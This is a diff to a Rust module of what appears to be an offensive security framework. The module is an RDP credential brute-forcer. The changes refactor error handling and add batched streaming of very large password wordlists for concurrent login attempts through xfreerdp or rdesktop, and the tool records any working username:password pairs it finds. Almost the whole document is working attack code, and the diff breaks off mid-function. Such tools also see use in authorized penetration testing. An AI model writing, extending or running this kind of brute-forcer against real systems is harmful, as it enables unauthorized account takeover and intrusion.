@@ -23,6 +23,8 @@ use crate::utils::{
 
 const PROGRESS_INTERVAL_SECS: u64 = 2;
 const MAX_MEMORY_LOAD_SIZE: u64 = 150 * 1024 * 1024; // 150 MB
+const PROGRESS_TIMEOUT_SECS: u64 = 5;
+const STREAMING_BATCH_SIZE: usize = 100; // Process passwords in batches for true streaming
 
 /// RDP-specific error types for better classification
 #[derive(Debug, Clone)]
@@ -53,33 +55,15 @@ impl std::fmt::Display for RdpError {
 }
 
 /// Classify RDP errors based on exit codes and error messages
-/// This function ensures all RdpError variants can be constructed
 fn classify_rdp_error(exit_code: Option<i32>, error_msg: &str) -> RdpError {
     match exit_code {
-        Some(0) => {
-            // Success case shouldn't reach here, but classify as Unknown if it does
-            RdpError::Unknown
-        }
-        Some(1) => {
-            // Authentication failed
-            RdpError::AuthenticationFailed
-        }
-        Some(2) => {
-            // Connection failed
-            RdpError::ConnectionFailed
-        }
-        Some(3) => {
-            // Certificate error
-            RdpError::CertificateError
-        }
-        Some(131) => {
-            // Connection timeout
-            RdpError::Timeout
-        }
+        Some(0) => RdpError::Unknown,
+        Some(1) => RdpError::AuthenticationFailed,
+        Some(2) => RdpError::ConnectionFailed,
+        Some(3) => RdpError::CertificateError,
+        Some(131) => RdpError::Timeout,
         Some(code) => {
-            // Unknown exit code - analyze error message for classification
-            // Use code for logging/debugging purposes to ensure it's not unused
-            let _ = code; // Acknowledge code is available for future use
+            eprintln!("[DEBUG] Unhandled exit code: {}", code);
             let msg_lower = error_msg.to_lowercase();
             if msg_lower.contains("timeout") || msg_lower.contains("timed out") || msg_lower.contains("deadline") {
                 RdpError::Timeout
@@ -94,12 +78,10 @@ fn classify_rdp_error(exit_code: Option<i32>, error_msg: &str) -> RdpError {
             } else if msg_lower.contains("protocol") || msg_lower.contains("invalid") || msg_lower.contains("malformed") {
                 RdpError::ProtocolError
             } else {
-                // Default to ProtocolError for unknown exit codes
                 RdpError::ProtocolError
             }
         }
         None => {
-            // Process terminated by signal - analyze message for classification
             let msg_lower = error_msg.to_lowercase();
             if msg_lower.contains("timeout") || msg_lower.contains("timed out") || msg_lower.contains("deadline") {
                 RdpError::Timeout
@@ -108,7 +90,6 @@ fn classify_rdp_error(exit_code: Option<i32>, error_msg: &str) -> RdpError {
             } else if msg_lower.contains("network") || msg_lower.contains("dns") {
                 RdpError::NetworkError
             } else {
-                // Unknown termination reason
                 RdpError::Unknown
             }
         }
@@ -290,18 +271,18 @@ pub async fn run(target: &str) -> Result<()> {
     }
     println!("[*] Loaded {} usernames", user_count);
 
-    let password_count = load_lines(&passwords_file_path)?.len();
+    let password_count = count_lines(&passwords_file_path)?;
     if password_count == 0 {
         println!("[!] Password wordlist is empty or invalid. Exiting.");
         return Ok(());
     }
-    println!("[*] Loaded {} passwords", password_count);
+    println!("[*] Password file contains {} passwords", password_count);
 
-    let total_attempts = if combo_mode { user_count * password_count } else { password_count };
+    let total_attempts = if combo_mode { user_count * password_count } else { std::cmp::max(user_count, password_count) };
     println!("{}", format!("[*] Total attempts: {}", total_attempts).cyan());
     println!();
 
-    // Start progress reporter
+    // Start progress reporter with timeout for shutdown
     let stats_clone = stats.clone();
     let stop_clone = stop_signal.clone();
     let progress_handle = tokio::spawn(async move {
@@ -315,21 +296,21 @@ pub async fn run(target: &str) -> Result<()> {
     });
 
     // Execute appropriate mode
-    if combo_mode {
+    let execution_result = if combo_mode {
         // Check if password file is too large for memory loading
         let use_streaming = should_use_streaming(&passwords_file_path)?;
         let pass_file_size = std::fs::metadata(&passwords_file_path)?.len();
 
         if use_streaming {
-            println!("{}", format!("[*] Password file is {} (>{}), using streaming mode to save memory",
+            println!("{}", format!("[*] Password file is {} (>{}), using TRUE streaming mode",
                 format_file_size(pass_file_size), format_file_size(MAX_MEMORY_LOAD_SIZE)).yellow());
-            println!("{}", "[*] Streaming mode: processing users sequentially to conserve memory".yellow());
+            println!("{}", "[*] Streaming mode: processing passwords in batches to conserve memory".yellow());
 
             run_combo_mode_streaming(
                 &addr, &usernames_file_path, &passwords_file_path,
                 concurrency, timeout_secs, stop_on_success, verbose, security_level,
                 found_credentials.clone(), stop_signal.clone(), stats.clone()
-            ).await?;
+            ).await
         } else {
             println!("{}", format!("[*] Password file is {}, using memory-loaded mode for optimal performance",
                 format_file_size(pass_file_size)).cyan());
@@ -338,7 +319,7 @@ pub async fn run(target: &str) -> Result<()> {
                 &addr, &usernames_file_path, &passwords_file_path,
                 concurrency, timeout_secs, stop_on_success, verbose, security_level,
                 found_credentials.clone(), stop_signal.clone(), stats.clone()
-            ).await?;
+            ).await
         }
     } else {
         // Sequential mode: cycle through users for each password
@@ -346,12 +327,22 @@ pub async fn run(target: &str) -> Result<()> {
             &addr, &usernames_file_path, &passwords_file_path,
             concurrency, timeout_secs, stop_on_success, verbose, security_level,
             found_credentials.clone(), stop_signal.clone(), stats.clone()
-        ).await?;
+        ).await
+    };
+
+    // Stop progress reporter with timeout
+    stop_signal.store(true, Ordering::Relaxed);
+    match timeout(Duration::from_secs(PROGRESS_TIMEOUT_SECS), progress_handle).await {
+        Ok(_) => {},
+        Err(_) => {
+            eprintln!("{}", "[!] Progress reporter did not stop cleanly".yellow());
+        }
     }
 
-    // Stop progress reporter
-    stop_signal.store(true, Ordering::Relaxed);
-    let _ = progress_handle.await;
+    // Check if execution had errors
+    if let Err(e) = execution_result {
+        eprintln!("{}", format!("[!] Execution error: {}", e).red());
+    }
 
     // Print final statistics
     stats.print_final();
@@ -388,7 +379,7 @@ pub async fn run(target: &str) -> Result<()> {
     Ok(())
 }
 
-/// Sequential mode: cycle through users for each password
+/// Sequential mode: test each password with all users
 async fn run_sequential_mode(
     addr: &str,
     usernames_file_path: &str,
@@ -402,9 +393,6 @@ async fn run_sequential_mode(
     stop_signal: Arc<AtomicBool>,
     stats: Arc<Statistics>,
 ) -> Result<()> {
-    let pass_file = File::open(passwords_file_path)?;
-            let pass_reader = BufReader::new(pass_file);
-            
     // Load users into memory for cycling
     let users = load_lines(usernames_file_path)?;
     if users.is_empty() {
@@ -414,88 +402,100 @@ async fn run_sequential_mode(
     let semaphore = Arc::new(Semaphore::new(concurrency));
     let mut tasks: FuturesUnordered<_> = FuturesUnordered::new();
 
-    for (i, pass_line) in pass_reader.lines().enumerate() {
-                if stop_on_success && stop_signal.load(Ordering::Relaxed) {
-                    break;
+    let pass_file = File::open(passwords_file_path)
+        .context("Failed to open password file")?;
+    let pass_reader = BufReader::new(pass_file);
+
+    // Test each password with ALL users
+    for pass_line in pass_reader.lines() {
+        if stop_on_success && stop_signal.load(Ordering::Relaxed) {
+            break;
+        }
+        
+        let pass = match pass_line {
+            Ok(line) => line.trim().to_string(),
+            Err(_) => continue,
+        };
+        
+        if pass.is_empty() {
+            continue;
+        }
+
+        // Test this password with all users
+        for user in &users {
+            if stop_on_success && stop_signal.load(Ordering::Relaxed) {
+                break;
+            }
+
+            let addr_clone = addr.to_string();
+            let user_clone = user.clone();
+            let pass_clone = pass.clone();
+            let found_credentials_clone = Arc::clone(&found_credentials);
+            let stop_signal_clone = Arc::clone(&stop_signal);
+            let semaphore_clone = Arc::clone(&semaphore);
+            let stats_clone = Arc::clone(&stats);
+            let timeout_duration = Duration::from_secs(timeout_secs);
+
+            tasks.push(tokio::spawn(async move {
+                if stop_on_success && stop_signal_clone.load(Ordering::Relaxed) {
+                    return;
                 }
-                
-                let pass = match pass_line {
-                    Ok(line) => line.trim().to_string(),
-                    Err(_) => continue,
+
+                let permit = match semaphore_clone.acquire_owned().await {
+                    Ok(permit) => permit,
+                    Err(_) => return,
                 };
-                
-                if pass.is_empty() {
-                    continue;
+
+                if stop_on_success && stop_signal_clone.load(Ordering::Relaxed) {
+                    return;
                 }
 
-        let user = users[i % users.len()].clone();
-        let addr_clone = addr.to_string();
-                let pass_clone = pass.clone();
-                let found_credentials_clone = Arc::clone(&found_credentials);
-                let stop_signal_clone = Arc::clone(&stop_signal);
-                let semaphore_clone = Arc::clone(&semaphore);
-                let stats_clone = Arc::clone(&stats);
-                let timeout_duration = Duration::from_secs(timeout_secs);
-
-                tasks.push(tokio::spawn(async move {
-            if stop_on_success && stop_signal_clone.load(Ordering::Relaxed) {
-                        return;
-                    }
-
-                    let permit = match semaphore_clone.acquire_owned().await {
-                        Ok(permit) => permit,
-                        Err(_) => return,
-                    };
-
-            if stop_on_success && stop_signal_clone.load(Ordering::Relaxed) {
-                        return;
-                    }
-
-            match try_rdp_login(&addr_clone, &user, &pass_clone, timeout_duration, security_level).await {
-                        Ok(true) => {
-                    println!("\r{}", format!("[+] {} -> {}:{}", addr_clone, user, pass_clone).green().bold());
-                            let mut found = found_credentials_clone.lock().await;
-                    found.push((addr_clone.clone(), user.clone(), pass_clone.clone()));
-                            stats_clone.record_attempt(true, false);
-                    if stop_on_success {
-                                stop_signal_clone.store(true, Ordering::Relaxed);
-                            }
-                        }
-                        Ok(false) => {
-                            stats_clone.record_attempt(false, false);
-                    if verbose {
-                        println!("\r{}", format!("[-] {} -> {}:{}", addr_clone, user, pass_clone).dimmed());
-                            }
-                        }
-                        Err(e) => {
-                            stats_clone.record_attempt(false, true);
-                    if verbose {
-                                println!("\r{}", format!("[!] {}: error: {}", addr_clone, e).red());
-                            }
+                match try_rdp_login(&addr_clone, &user_clone, &pass_clone, timeout_duration, security_level).await {
+                    Ok(true) => {
+                        println!("\r{}", format!("[+] {} -> {}:{}", addr_clone, user_clone, pass_clone).green().bold());
+                        let mut found = found_credentials_clone.lock().await;
+                        found.push((addr_clone.clone(), user_clone.clone(), pass_clone.clone()));
+                        stats_clone.record_attempt(true, false);
+                        if stop_on_success {
+                            stop_signal_clone.store(true, Ordering::Relaxed);
                         }
                     }
+                    Ok(false) => {
+                        stats_clone.record_attempt(false, false);
+                        if verbose {
+                            println!("\r{}", format!("[-] {} -> {}:{}", addr_clone, user_clone, pass_clone).dimmed());
+                        }
+                    }
+                    Err(e) => {
+                        stats_clone.record_attempt(false, true);
+                        if verbose {
+                            eprintln!("\r{}", format!("[!] {}: error: {}", addr_clone, e).red());
+                        }
+                    }
+                }
 
-                    drop(permit);
-                    sleep(Duration::from_millis(10)).await;
-                }));
+                drop(permit);
+                sleep(Duration::from_millis(10)).await;
+            }));
 
-                // Limit concurrent tasks
-                if tasks.len() >= concurrency {
-                    if let Some(res) = tasks.next().await {
-                        if let Err(e) = res {
-                    if verbose {
-                        println!("\r{}", format!("[!] Task join error: {}", e).red());
+            // Limit concurrent tasks
+            while tasks.len() >= concurrency {
+                if let Some(res) = tasks.next().await {
+                    if let Err(e) = res {
+                        if verbose {
+                            eprintln!("\r{}", format!("[!] Task join error: {}", e).red());
                         }
                     }
                 }
             }
         }
+    }
 
     // Wait for remaining tasks
     while let Some(res) = tasks.next().await {
         if let Err(e) = res {
             if verbose {
-                println!("\r{}", format!("[!] Task join error: {}", e).red());
+                eprintln!("\r{}", format!("[!] Task join error: {}", e).red());
             }
         }
     }
@@ -518,126 +518,8 @@ async fn run_combo_mode_memory(
     stats: Arc<Statistics>,
 ) -> Result<()> {
     let passwords = load_lines(passwords_file_path)?;
-    let user_file = File::open(usernames_file_path)?;
-    let user_reader = BufReader::new(user_file);
-
-    let semaphore = Arc::new(Semaphore::new(concurrency));
-    let mut tasks: FuturesUnordered<_> = FuturesUnordered::new();
-
-    for user_line in user_reader.lines() {
-            if stop_on_success && stop_signal.load(Ordering::Relaxed) {
-                break;
-            }
-            
-        let user = match user_line {
-                Ok(line) => line.trim().to_string(),
-                Err(_) => continue,
-            };
-            
-        if user.is_empty() {
-                continue;
-            }
-            
-        for pass in &passwords {
-            if stop_on_success && stop_signal.load(Ordering::Relaxed) {
-                break;
-            }
-
-            if pass.is_empty() {
-                continue;
-            }
-
-            let addr_clone = addr.to_string();
-            let user_clone = user.clone();
-                let pass_clone = pass.clone();
-                let found_credentials_clone = Arc::clone(&found_credentials);
-                let stop_signal_clone = Arc::clone(&stop_signal);
-                let semaphore_clone = Arc::clone(&semaphore);
-                let stats_clone = Arc::clone(&stats);
-                let timeout_duration = Duration::from_secs(timeout_secs);
-
-                tasks.push(tokio::spawn(async move {
-                if stop_on_success && stop_signal_clone.load(Ordering::Relaxed) {
-                        return;
-                    }
-
-                    let permit = match semaphore_clone.acquire_owned().await {
-                        Ok(permit) => permit,
-                        Err(_) => return,
-                    };
-
-                if stop_on_success && stop_signal_clone.load(Ordering::Relaxed) {
-                        return;
-                    }
-
-                match try_rdp_login(&addr_clone, &user_clone, &pass_clone, timeout_duration, security_level).await {
-                        Ok(true) => {
-                        println!("\r{}", format!("[+] {} -> {}:{}", addr_clone, user_clone, pass_clone).green().bold());
-                            let mut found = found_credentials_clone.lock().await;
-                        found.push((addr_clone.clone(), user_clone.clone(), pass_clone.clone()));
-                            stats_clone.record_attempt(true, false);
-                        if stop_on_success {
-                                stop_signal_clone.store(true, Ordering::Relaxed);
-                            }
-                        }
-                        Ok(false) => {
-                            stats_clone.record_attempt(false, false);
-                        if verbose {
-                            println!("\r{}", format!("[-] {} -> {}:{}", addr_clone, user_clone, pass_clone).dimmed());
-                            }
-                        }
-                        Err(e) => {
-                            stats_clone.record_attempt(false, true);
-                        if verbose {
-                            eprintln!("\r{}", format!("[!] {}: error: {}", addr_clone, e).red());
-                            }
-                        }
-                    }
-
-                    drop(permit);
-                    sleep(Duration::from_millis(10)).await;
-                }));
-
-            // Limit concurrent tasks
-            if tasks.len() >= concurrency {
-                if let Some(res) = tasks.next().await {
-                    if let Err(e) = res {
-                        if verbose {
-                            println!("\r{}", format!("[!] Task error: {}", e).red());
-                        }
-                    }
-                }
-            }
-        }
-    }
-
-    // Wait for remaining tasks
-    while let Some(res) = tasks.next().await {
-        if let Err(e) = res {
-            if verbose {
-                println!("\r{}", format!("[!] Task error: {}", e).red());
-            }
-        }
-    }
-
-    Ok(())
-}
-
-/// Combo mode using streaming (for large password files to prevent memory exhaustion)
-async fn run_combo_mode_streaming(
-    addr: &str,
-    usernames_file_path: &str,
-    passwords_file_path: &str,
-    concurrency: usize,
-    timeout_secs: u64,
-    stop_on_success: bool,
-    verbose: bool,
-    security_level: RdpSecurityLevel,
-    found_credentials: Arc<Mutex<Vec<(String, String, String)>>>,
-    stop_signal: Arc<AtomicBool>,
-    stats: Arc<Statistics>,
-) -> Result<()> {
-    let user_file = File::open(usernames_file_path)?;
+    let user_file = File::open(usernames_file_path)
+        .context("Failed to open username file")?;
     let user_reader = BufReader::new(user_file);
 
     let semaphore = Arc::new(Semaphore::new(concurrency));
@@ -647,28 +529,20 @@ async fn run_combo_mode_streaming(
         if stop_on_success && stop_signal.load(Ordering::Relaxed) {
             break;
         }
-
+        
         let user = match user_line {
             Ok(line) => line.trim().to_string(),
             Err(_) => continue,
         };
-
+        
         if user.is_empty() {
             continue;
         }
-
-        let pass_file = File::open(passwords_file_path)?;
-        let pass_reader = BufReader::new(pass_file);
-
-        for pass_line in pass_reader.lines() {
+        
+        for pass in &passwords {
             if stop_on_success && stop_signal.load(Ordering::Relaxed) {
-                            break;
-                        }
-
-            let pass = match pass_line {
-                Ok(line) => line.trim().to_string(),
-                Err(_) => continue,
-            };
+                break;
+            }
 
             if pass.is_empty() {
                 continue;
@@ -712,8 +586,8 @@ async fn run_combo_mode_streaming(
                         if verbose {
                             println!("\r{}", format!("[-] {} -> {}:{}", addr_clone, user_clone, pass_clone).dimmed());
                         }
-                }
-                Err(e) => {
+                    }
+                    Err(e) => {
                         stats_clone.record_attempt(false, true);
                         if verbose {
                             eprintln!("\r{}", format!("[!] {}: error: {}", addr_clone, e).red());
@@ -726,11 +600,11 @@ async fn run_combo_mode_streaming(
             }));
 
             // Limit concurrent tasks
-            if tasks.len() >= concurrency {
+            while tasks.len() >= concurrency {
                 if let Some(res) = tasks.next().await {
                     if let Err(e) = res {
                         if verbose {
-                            println!("\r{}", format!("[!] Task error: {}", e).red());
+                            eprintln!("\r{}", format!("[!] Task error: {}", e).red());
                         }
                     }
                 }
@@ -742,7 +616,221 @@ async fn run_combo_mode_streaming(
     while let Some(res) = tasks.next().await {
         if let Err(e) = res {
             if verbose {
-                println!("\r{}", format!("[!] Task error: {}", e).red());
+                eprintln!("\r{}", format!("[!] Task error: {}", e).red());
+            }
+        }
+    }
+
+    Ok(())
+}
+
+/// TRUE STREAMING mode - processes passwords in small batches without loading entire file
+/// Can handle 100GB+ password files with minimal memory usage
+async fn run_combo_mode_streaming(
+    addr: &str,
+    usernames_file_path: &str,
+    passwords_file_path: &str,
+    concurrency: usize,
+    timeout_secs: u64,
+    stop_on_success: bool,
+    verbose: bool,
+    security_level: RdpSecurityLevel,
+    found_credentials: Arc<Mutex<Vec<(String, String, String)>>>,
+    stop_signal: Arc<AtomicBool>,
+    stats: Arc<Statistics>,
+) -> Result<()> {
+    // Load usernames into memory (typically much smaller than passwords)
+    let users = load_lines(usernames_file_path)?;
+    if users.is_empty() {
+        return Err(anyhow!("No valid users loaded"));
+    }
+
+    let semaphore = Arc::new(Semaphore::new(concurrency));
+    
+    println!("{}", format!("[*] TRUE STREAMING: Processing {} users against password file in batches of {}",
+        users.len(), STREAMING_BATCH_SIZE).cyan());
+
+    // Process password file in batches
+    let pass_file = File::open(passwords_file_path)
+        .context("Failed to open password file")?;
+    let pass_reader = BufReader::new(pass_file);
+    
+    let mut password_batch = Vec::with_capacity(STREAMING_BATCH_SIZE);
+    let mut batch_number = 0;
+
+    for pass_line in pass_reader.lines() {
+        if stop_on_success && stop_signal.load(Ordering::Relaxed) {
+            break;
+        }
+
+        let pass = match pass_line {
+            Ok(line) => line.trim().to_string(),
+            Err(_) => continue,
+        };
+
+        if pass.is_empty() {
+            continue;
+        }
+
+        password_batch.push(pass);
+
+        // Process batch when full
+        if password_batch.len() >= STREAMING_BATCH_SIZE {
+            batch_number += 1;
+            if verbose {
+                println!("{}", format!("[*] Processing password batch #{} ({} passwords)", 
+                    batch_number, password_batch.len()).dimmed());
+            }
+
+            // Process this batch against all users
+            process_password_batch(
+                addr,
+                &users,
+                &password_batch,
+                concurrency,
+                timeout_secs,
+                stop_on_success,
+                verbose,
+                security_level,
+                found_credentials.clone(),
+                stop_signal.clone(),
+                stats.clone(),
+                &semaphore,
+            ).await?;
+
+            // Clear batch for next iteration
+            password_batch.clear();
+
+            // Check if we should stop
+            if stop_on_success && stop_signal.load(Ordering::Relaxed) {
+                break;
+            }
+        }
+    }
+
+    // Process remaining passwords in final batch
+    if !password_batch.is_empty() && !(stop_on_success && stop_signal.load(Ordering::Relaxed)) {
+        batch_number += 1;
+        if verbose {
+            println!("{}", format!("[*] Processing final password batch #{} ({} passwords)", 
+                batch_number, password_batch.len()).dimmed());
+        }
+
+        process_password_batch(
+            addr,
+            &users,
+            &password_batch,
+            concurrency,
+            timeout_secs,
+            stop_on_success,
+            verbose,
+            security_level,
+            found_credentials.clone(),
+            stop_signal.clone(),
+            stats.clone(),
+            &semaphore,
+        ).await?;
+    }
+
+    Ok(())
+}
+
+/// Process a batch of passwords against all users
+async fn process_password_batch(
+    addr: &str,
+    users: &[String],
+    passwords: &[String],
+    concurrency: usize,
+    timeout_secs: u64,
+    stop_on_success: bool,
+    verbose: bool,
+    security_level: RdpSecurityLevel,
+    found_credentials: Arc<Mutex<Vec<(String, String, String)>>>,
+    stop_signal: Arc<AtomicBool>,
+    stats: Arc<Statistics>,
+    semaphore: &Arc<Semaphore>,
+) -> Result<()> {
+    let mut tasks: FuturesUnordered<_> = FuturesUnordered::new();
+
+    for user in users {
+        if stop_on_success && stop_signal.load(Ordering::Relaxed) {
+            break;
+        }
+
+        for pass in passwords {
+            if stop_on_success && stop_signal.load(Ordering::Relaxed) {
+                break;
+            }
+
+            let addr_clone = addr.to_string();
+            let user_clone = user.clone();
+            let pass_clone = pass.clone();
+            let found_credentials_clone = Arc::clone(&found_credentials);
+            let stop_signal_clone = Arc::clone(&stop_signal);
+            let semaphore_clone = Arc::clone(semaphore);
+            let stats_clone = Arc::clone(&stats);
+            let timeout_duration = Duration::from_secs(timeout_secs);
+
+            tasks.push(tokio::spawn(async move {
+                if stop_on_success && stop_signal_clone.load(Ordering::Relaxed) {
+                    return;
+                }
+
+                let permit = match semaphore_clone.acquire_owned().await {
+                    Ok(permit) => permit,
+                    Err(_) => return,
+                };
+
+                if stop_on_success && stop_signal_clone.load(Ordering::Relaxed) {
+                    return;
+                }
+
+                match try_rdp_login(&addr_clone, &user_clone, &pass_clone, timeout_duration, security_level).await {
+                    Ok(true) => {
+                        println!("\r{}", format!("[+] {} -> {}:{}", addr_clone, user_clone, pass_clone).green().bold());
+                        let mut found = found_credentials_clone.lock().await;
+                        found.push((addr_clone.clone(), user_clone.clone(), pass_clone.clone()));
+                        stats_clone.record_attempt(true, false);
+                        if stop_on_success {
+                            stop_signal_clone.store(true, Ordering::Relaxed);
+                        }
+                    }
+                    Ok(false) => {
+                        stats_clone.record_attempt(false, false);
+                        if verbose {
+                            println!("\r{}", format!("[-] {} -> {}:{}", addr_clone, user_clone, pass_clone).dimmed());
+                        }
+                    }
+                    Err(e) => {
+                        stats_clone.record_attempt(false, true);
+                        if verbose {
+                            eprintln!("\r{}", format!("[!] {}: error: {}", addr_clone, e).red());
+                        }
+                    }
+                }
+
+                drop(permit);
+                sleep(Duration::from_millis(10)).await;
+            }));
+
+            // Limit concurrent tasks
+            while tasks.len() >= concurrency {
+                if let Some(res) = tasks.next().await {
+                    if let Err(e) = res {
+                        if verbose {
+                            eprintln!("\r{}", format!("[!] Task error: {}", e).red());
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    // Wait for remaining tasks in this batch
+    while let Some(res) = tasks.next().await {
+        if let Err(e) = res {
+            if verbose {
+                eprintln!("\r{}", format!("[!] Task error: {}", e).red());
             }
         }
     }
@@ -760,8 +848,8 @@ async fn try_rdp_login(addr: &str, user: &str, pass: &str, timeout_duration: Dur
         .unwrap_or(false);
 
     let rdesktop_available = Command::new("which")
-            .arg("rdesktop")
-            .output()
+        .arg("rdesktop")
+        .output()
         .await
         .map(|output| output.status.success())
         .unwrap_or(false);
@@ -783,6 +871,12 @@ async fn try_rdp_login_xfreerdp(addr: &str, user: &str, pass: &str, timeout_dura
     let sanitized_user = sanitize_rdp_argument(user);
     let sanitized_pass = sanitize_rdp_argument(pass);
 
+    // Log if sanitization occurred (for debugging)
+    if addr != sanitized_addr || user != sanitized_user || pass != sanitized_pass {
+        eprintln!("[DEBUG] Sanitization occurred: addr={} user={} pass={}",
+            addr != sanitized_addr, user != sanitized_user, pass != sanitized_pass);
+    }
+
     let mut child = match Command::new("xfreerdp")
         .arg(format!("/v:{}", sanitized_addr))
         .arg(format!("/u:{}", sanitized_user))
@@ -798,21 +892,8 @@ async fn try_rdp_login_xfreerdp(addr: &str, user: &str, pass: &str, timeout_dura
     {
         Ok(child) => child,
         Err(e) => {
-            // Classify spawn errors - could be ConnectionFailed, NetworkError, or ProtocolError
-            // This ensures all error types can be constructed from spawn failures
             let error_type = classify_rdp_error(None, &e.to_string());
-            // Explicitly match all variants to ensure they're all constructed
-            let error_msg = match error_type {
-                RdpError::ConnectionFailed => format!("{}: {}", RdpError::ConnectionFailed, e),
-                RdpError::NetworkError => format!("{}: {}", RdpError::NetworkError, e),
-                RdpError::ProtocolError => format!("{}: {}", RdpError::ProtocolError, e),
-                RdpError::Timeout => format!("{}: {}", RdpError::Timeout, e),
-                RdpError::AuthenticationFailed => format!("{}: {}", RdpError::AuthenticationFailed, e),
-                RdpError::CertificateError => format!("{}: {}", RdpError::CertificateError, e),
-                RdpError::ToolNotFound => format!("{}: {}", RdpError::ToolNotFound, e),
-                RdpError::Unknown => format!("{}: {}", RdpError::Unknown, e),
-            };
-            return Err(anyhow!("{}", error_msg));
+            return Err(anyhow!("{}: {}", error_type, e));
         }
     };
 
@@ -821,9 +902,7 @@ async fn try_rdp_login_xfreerdp(addr: &str, user: &str, pass: &str, timeout_dura
             match status.code() {
                 Some(0) => Ok(true), // Success
                 Some(code) => {
-                    // Classify error based on exit code
                     let error_type = classify_rdp_error(Some(code), "");
-                    // Ensure all error types can be constructed and handled
                     match error_type {
                         RdpError::AuthenticationFailed => Ok(false),
                         RdpError::ConnectionFailed => Ok(false),
@@ -836,12 +915,10 @@ async fn try_rdp_login_xfreerdp(addr: &str, user: &str, pass: &str, timeout_dura
                     }
                 }
                 None => {
-                    // Process terminated by signal - classify for completeness
-                    // This ensures Unknown error type is constructed
-                    let error_type = classify_rdp_error(None, "Process terminated");
+                    let error_type = classify_rdp_error(None, "Process terminated by signal");
                     match error_type {
                         RdpError::Timeout | RdpError::ConnectionFailed | RdpError::NetworkError | RdpError::Unknown => Ok(false),
-                        _ => Ok(false), // All other types also return false
+                        _ => Ok(false),
                     }
                 }
             }
@@ -850,29 +927,12 @@ async fn try_rdp_login_xfreerdp(addr: &str, user: &str, pass: &str, timeout_dura
             let _ = child.kill().await;
             tokio::time::sleep(Duration::from_millis(50)).await;
             let error_type = classify_rdp_error(None, &e.to_string());
-            // Explicitly match all variants to ensure they're all constructed
-            let error_msg = match error_type {
-                RdpError::ConnectionFailed => format!("{}: {}", RdpError::ConnectionFailed, e),
-                RdpError::NetworkError => format!("{}: {}", RdpError::NetworkError, e),
-                RdpError::ProtocolError => format!("{}: {}", RdpError::ProtocolError, e),
-                RdpError::Timeout => format!("{}: {}", RdpError::Timeout, e),
-                RdpError::AuthenticationFailed => format!("{}: {}", RdpError::AuthenticationFailed, e),
-                RdpError::CertificateError => format!("{}: {}", RdpError::CertificateError, e),
-                RdpError::ToolNotFound => format!("{}: {}", RdpError::ToolNotFound, e),
-                RdpError::Unknown => format!("{}: {}", RdpError::Unknown, e),
-            };
-            Err(anyhow!("{}", error_msg))
+            Err(anyhow!("{}: {}", error_type, e))
         }
         Err(_) => {
-            // Timeout occurred - ensure Timeout error type is constructed
             let _ = child.kill().await;
             tokio::time::sleep(Duration::from_millis(200)).await;
-            let error_type = classify_rdp_error(Some(131), "Connection timeout");
-            // Ensure Timeout variant is constructed
-            match error_type {
-                RdpError::Timeout => Ok(false),
-                _ => Ok(false), // Should not happen, but handle all cases
-            }
+            Ok(false)
         }
     }
 }
@@ -893,31 +953,17 @@ async fn try_rdp_login_rdesktop(addr: &str, user: &str, pass: &str, timeout_dura
     let mut child = match cmd.spawn() {
         Ok(child) => child,
         Err(e) => {
-            // Classify spawn errors - ensures all error types can be constructed
             let error_type = classify_rdp_error(None, &e.to_string());
-            // Explicitly match all variants to ensure they're all constructed
-            let error_msg = match error_type {
-                RdpError::ConnectionFailed => format!("{}: {}", RdpError::ConnectionFailed, e),
-                RdpError::NetworkError => format!("{}: {}", RdpError::NetworkError, e),
-                RdpError::ProtocolError => format!("{}: {}", RdpError::ProtocolError, e),
-                RdpError::Timeout => format!("{}: {}", RdpError::Timeout, e),
-                RdpError::AuthenticationFailed => format!("{}: {}", RdpError::AuthenticationFailed, e),
-                RdpError::CertificateError => format!("{}: {}", RdpError::CertificateError, e),
-                RdpError::ToolNotFound => format!("{}: {}", RdpError::ToolNotFound, e),
-                RdpError::Unknown => format!("{}: {}", RdpError::Unknown, e),
-            };
-            return Err(anyhow!("{}", error_msg));
+            return Err(anyhow!("{}: {}", error_type, e));
         }
     };
 
     match timeout(timeout_duration, child.wait()).await {
         Ok(Ok(status)) => {
             match status.code() {
-                Some(0) => Ok(true), // Success
+                Some(0) => Ok(true),
                 Some(code) => {
-                    // Classify error based on exit code
                     let error_type = classify_rdp_error(Some(code), "");
-                    // Ensure all error types can be constructed and handled
                     match error_type {
                         RdpError::AuthenticationFailed => Ok(false),
                         RdpError::ConnectionFailed => Ok(false),
@@ -930,12 +976,10 @@ async fn try_rdp_login_rdesktop(addr: &str, user: &str, pass: &str, timeout_dura
                     }
                 }
                 None => {
-                    // Process terminated by signal - classify for completeness
-                    // This ensures Unknown error type is constructed
-                    let error_type = classify_rdp_error(None, "Process terminated");
+                    let error_type = classify_rdp_error(None, "Process terminated by signal");
                     match error_type {
                         RdpError::Timeout | RdpError::ConnectionFailed | RdpError::NetworkError | RdpError::Unknown => Ok(false),
-                        _ => Ok(false), // All other types also return false
+                        _ => Ok(false),
                     }
                 }
             }
@@ -944,56 +988,24 @@ async fn try_rdp_login_rdesktop(addr: &str, user: &str, pass: &str, timeout_dura
             let _ = child.kill().await;
             tokio::time::sleep(Duration::from_millis(50)).await;
             let error_type = classify_rdp_error(None, &e.to_string());
-            // Explicitly match all variants to ensure they're all constructed
-            let error_msg = match error_type {
-                RdpError::ConnectionFailed => format!("{}: {}", RdpError::ConnectionFailed, e),
-                RdpError::NetworkError => format!("{}: {}", RdpError::NetworkError, e),
-                RdpError::ProtocolError => format!("{}: {}", RdpError::ProtocolError, e),
-                RdpError::Timeout => format!("{}: {}", RdpError::Timeout, e),
-                RdpError::AuthenticationFailed => format!("{}: {}", RdpError::AuthenticationFailed, e),
-                RdpError::CertificateError => format!("{}: {}", RdpError::CertificateError, e),
-                RdpError::ToolNotFound => format!("{}: {}", RdpError::ToolNotFound, e),
-                RdpError::Unknown => format!("{}: {}", RdpError::Unknown, e),
-            };
-            Err(anyhow!("{}", error_msg))
+            Err(anyhow!("{}: {}", error_type, e))
         }
         Err(_) => {
-            // Timeout occurred - ensure Timeout error type is constructed
             let _ = child.kill().await;
             tokio::time::sleep(Duration::from_millis(200)).await;
-            let error_type = classify_rdp_error(Some(131), "Connection timeout");
-            // Ensure Timeout variant is constructed
-            match error_type {
-                RdpError::Timeout => Ok(false),
-                _ => Ok(false), // Should not happen, but handle all cases
-            }
+            Ok(false)
         }
     }
 }
 
-
-
-
-
-
-
-
-
 fn sanitize_rdp_argument(input: &str) -> String {
     input.chars()
         .map(|c| match c {
-            // Handle whitespace characters first (before control character range)
